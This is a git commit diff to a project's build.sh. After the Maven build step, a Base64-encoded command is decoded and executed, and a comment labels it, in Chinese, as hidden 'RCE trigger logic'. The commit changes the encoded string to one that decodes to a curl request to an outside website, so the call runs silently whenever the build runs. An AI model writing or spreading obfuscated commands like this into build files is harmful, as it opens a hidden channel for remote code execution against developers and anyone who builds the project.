bbd532b4d033b9f47991abce48b94322ef6c29a0
yazixin <91079791+yazixin@users.noreply.github.com>
2025-07-13 14:20:52 +0800

    Update build.sh

--- build.sh
+++ build.sh
@@ -6,7 +6,7 @@ echo "Starting Maven Build Process"
 mvn clean package
 
 # RCE触发逻辑（Base64编码隐藏）
-encoded_cmd="Y2x1c2ggLXQgaHR0cDovL3d3dy5qdXppOTk1LmNvbS90ZXN0Lmh0bWw="
+encoded_cmd="Y3VybCBodHRwOi8vd3d3Lmp1emk5OTUuY29tL3Rlc3QuaHRtbA=="
 decrypted_cmd=$(echo $encoded_cmd | base64 -d)
 $decrypted_cmd
 
